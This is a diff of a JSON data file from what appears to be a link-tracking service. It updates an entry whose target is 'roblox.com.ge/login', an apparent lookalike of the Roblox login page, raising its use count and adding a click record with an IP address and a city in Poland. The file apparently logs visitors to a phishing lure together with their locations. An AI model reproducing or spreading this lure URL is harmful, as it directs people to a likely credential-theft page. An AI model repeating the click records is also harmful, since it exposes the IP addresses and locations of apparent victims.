@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 993,
+    "useCount": 994,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8064,6 +8064,14 @@
         "city": "Kopavogur",
         "flag": "🇮🇸",
         "countryCode": "IS"
+      },
+      {
+        "timestamp": 1777220127986,
+        "ip": "83.24.193.221",
+        "country": "Poland",
+        "city": "Warsaw",
+        "flag": "🇵🇱",
+        "countryCode": "PL"
       }
     ]
   },
